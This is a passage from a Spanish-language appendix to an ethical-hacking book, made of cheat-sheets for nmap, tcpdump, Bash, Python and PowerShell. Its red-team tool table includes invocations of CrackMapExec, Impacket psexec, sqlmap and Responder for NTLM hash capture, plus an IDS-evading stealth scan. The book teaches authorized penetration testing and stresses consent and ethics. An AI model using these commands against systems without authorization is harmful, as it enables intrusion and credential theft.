| Salida en XML             | `nmap -oX scan.xml <IP>`  | Genera reporte exportable.           |
| Escaneo en red completa   | `nmap -sn 192.168.1.0/24` | Descubre hosts activos.              |
| Detección de scripts NSE  | `nmap --script vuln <IP>` | Ejecuta scripts de vulnerabilidades. |
| Escaneo furtivo           | `nmap -Pn -T2 -sS <IP>`   | Sin ping, menor detección por IDS.   |

**Consejo:** usa `grep`, `awk` o `xmlstarlet` para automatizar parsing en pipelines Bash o Python.

---

## 2. Cheat-Sheet de Tcpdump — *Análisis de tráfico y sniffing*

| Objetivo                 | Comando                     | Descripción                          |
| ------------------------ | --------------------------- | ------------------------------------ |
| Captura básica           | `tcpdump -i eth0`           | Captura todo el tráfico en interfaz. |
| Filtrar IP               | `tcpdump host 192.168.1.10` | Filtra tráfico de un host.           |
| Filtrar puerto           | `tcpdump port 80`           | Captura solo tráfico HTTP.           |
| Guardar captura          | `tcpdump -w captura.pcap`   | Escribe captura para Wireshark.      |
| Leer archivo             | `tcpdump -r captura.pcap`   | Analiza captura guardada.            |
| Captura con timestamp    | `tcpdump -tttt -n`          | Incluye fecha y hora detalladas.     |
| Filtrar protocolo        | `tcpdump udp`               | Solo UDP.                            |
| Capturar tamaño limitado | `tcpdump -s 128`            | Limita tamaño de cada paquete.       |

**Tip práctico:** combina con `grep` o `cut` para crear scripts de detección temprana de actividad sospechosa.

---

## 3. Cheat-Sheet de Bash — *Automatización y scripting rápido*

| Objetivo                | Comando / Sintaxis                    | Uso práctico                    |
| ----------------------- | ------------------------------------- | ------------------------------- |
| Bucle for               | `for i in {1..10}; do echo $i; done`  | Iteración básica.               |
| Sustitución de comandos | `echo $(date)`                        | Inserta salida de otro comando. |
| Condicional simple      | `if [ "$1" == "start" ]; then ... fi` | Control lógico.                 |
| Redirección             | `command > salida.txt 2>&1`           | Guarda stdout y stderr.         |
| Extracción con grep     | `grep "pattern" archivo`              | Filtro textual.                 |
| Sustitución múltiple    | `sed 's/foo/bar/g' archivo`           | Reemplazos masivos.             |
| Procesamiento paralelo  | `xargs -P 5`                          | Multiproceso.                   |
| Variables temporales    | `VAR=$(hostname)`                     | Asignación dinámica.            |

**Recomendación:** incluye siempre `set -euo pipefail` en scripts Bash para evitar errores silenciosos.

---

## 4. Cheat-Sheet de Python — *Scripting ofensivo y defensivo*

| Objetivo       | Código                                       | Descripción                         |
| -------------- | -------------------------------------------- | ----------------------------------- |
| Petición HTTP  | `requests.get("https://target")`             | Recolección de headers.             |
| Conexión TCP   | `socket.create_connection(("ip", 80))`       | Escaneo y banner grabbing.          |
| Leer archivo   | `open("file.txt").read()`                    | Lectura rápida de logs.             |
| Subproceso     | `subprocess.run(["nmap","-sS","127.0.0.1"])` | Integrar comandos del sistema.      |
| JSON a dict    | `json.load(open("data.json"))`               | Manejo de resultados estructurados. |
| Threading      | `threading.Thread(target=func).start()`      | Paralelismo.                        |
| Log simple     | `logging.info("Evento registrado")`          | Registro de auditoría.              |
| Pausa temporal | `time.sleep(2)`                              | Control de ejecución.               |

**Tip:** nunca ejecutes código que modifique sistemas sin verificación de entorno; usa rutas absolutas seguras y logs centralizados.

---

## 5. Cheat-Sheet de PowerShell (para entornos Windows Red Team)

| Comando                         | Propósito                               |
| ------------------------------- | --------------------------------------- |
| `Get-LocalUser`                 | Lista usuarios locales.                 |
| `Get-Service`                   | Muestra servicios activos.              |
| `Get-Process`                   | Procesos en ejecución.                  |
| `Test-NetConnection -Port 3389` | Verifica conectividad RDP.              |
| `Invoke-WebRequest`             | Descarga contenido remoto (controlado). |
| `Start-Transcript`              | Graba salida completa de sesión.        |
| `Set-ExecutionPolicy Bypass`    | Permite scripts locales (laboratorio).  |

**Advertencia:** deshabilita inmediatamente permisos de ejecución después del entrenamiento.

---

## 6. Cheat-Sheet de herramientas de Red Team clave

| Herramienta      | Uso principal                | Comando básico                             |
| ---------------- | ---------------------------- | ------------------------------------------ |
| **Metasploit**   | Framework de explotación     | `msfconsole -q`                            |
| **CrackMapExec** | Auditoría SMB/AD             | `cme smb <ip> -u user -p pass`             |
| **Impacket**     | Scripts SMB/RPC/Kerberos     | `python3 psexec.py user@target`            |
| **BloodHound**   | Análisis de Active Directory | `bloodhound-python -c All -u user -p pass` |
| **Burp Suite**   | Interceptar tráfico web      | GUI / `burpsuite --config`                 |
| **sqlmap**       | Inyección SQL automatizada   | `sqlmap -u <url> --batch`                  |
| **Responder**    | Captura hashes NTLM          | `responder -I eth0`                        |

---

## 7. Sección especial — “Impractical Mistakes” (Errores a evitar)

### 7.1 Técnicos

1. **Ejecutar escaneos fuera del alcance autorizado.**
   → Puede violar contratos o leyes locales.
2. **No documentar comandos ejecutados.**
   → Dificulta reconstruir resultados y defensa ante auditoría.
3. **Usar credenciales reales en entornos de prueba.**
   → Riesgo de fuga accidental o almacenamiento en logs.
4. **No validar IPs destino antes del escaneo.**
   → Un error tipográfico puede golpear sistemas ajenos.
5. **Ejecutar scripts sin timeout o control de errores.**
   → Puede congelar sistemas o generar falsos positivos.
6. **No aislar laboratorios virtuales.**
   → Posible contaminación cruzada o salida de tráfico no intencional.

### 7.2 Éticos y operacionales

1. **Asumir que “sólo era una prueba inofensiva”.**
   → Toda acción técnica debe estar respaldada por contrato o autorización escrita.
2. **Almacenar datos reales sin cifrado.**
   → Incluso en ejercicios simulados, todo dato sensible debe cifrarse y anonimizarse.
3. **No eliminar logs o capturas tras auditoría.**
   → Conservación indebida puede vulnerar políticas internas.
4. **Olvidar reportar hallazgos críticos a tiempo.**
   → Retrasos pueden dejar sistemas expuestos.
5. **Falta de sincronía con Blue Team.**
   → El Red Team no compite, coopera. Su rol es mejorar la defensa.

---

## 8. Listas de comprobación rápidas (para impresión o terminal)

### 8.1 Checklist de inicio de campaña

* [ ] Autorización escrita firmada.
* [ ] Alcance y reglas de enfrentamiento claros.
* [ ] Snapshots y backups previos.
* [ ] Red virtual aislada.
* [ ] Registro de logs y evidencias preparado.

### 8.2 Checklist de cierre

* [ ] Validación post-exploit controlado.
* [ ] Revisión de logs y limpieza.
* [ ] Eliminación de payloads temporales.
* [ ] Reporte estructurado entregado.
* [ ] Copias cifradas y destruidas según política.

---

## 9. Referencias recomendadas

### Documentos técnicos y frameworks

* **MITRE ATT&CK® Framework** — [https://attack.mitre.org](https://attack.mitre.org)
* **CIS Benchmarks** — Guías de configuración segura (Windows, Linux, Docker).
* **NIST SP 800-115** — *Technical Guide to Information Security Testing and Assessment.*
* **OWASP Testing Guide v4** — Auditoría de aplicaciones web.
* **PTES (Penetration Testing Execution Standard)** — Estandarización de metodologías ofensivas.
* **MITRE D3FEND** — Contramedidas defensivas mapeadas a ATT&CK.

### Libros y recursos prácticos

* *Red Team Development and Operations* — Joe Vest & James Tubberville.
* *The Hacker Playbook 3* — Peter Kim.
* *Advanced Penetration Testing* — Wil Allsopp.
* *Cybersecurity Blue Team Toolkit* — Nadean Tanner.
* *Python for Offensive PenTesters* — Hussam Khrais.

---

## 10. Conclusión

Este apéndice cierra *Full Red Team: Ethical Hacking* consolidando lo esencial:
la precisión técnica, la disciplina operativa y la ética profesional.

El Red Team moderno no depende de herramientas, sino de **criterio, trazabilidad y ética**.
Estas chuletas, listas y advertencias son el resumen operativo de una disciplina que exige rigor y responsabilidad.

Cada comando, cada script y cada línea de Python aquí documentada debe recordarte que la seguridad ofensiva no es destrucción, sino **comprensión profunda del riesgo**.

El verdadero Red Teamer no busca vulnerar sistemas, sino **fortalecerlos mediante el conocimiento**.

---

Autor: Alejandro G Vera, 2025
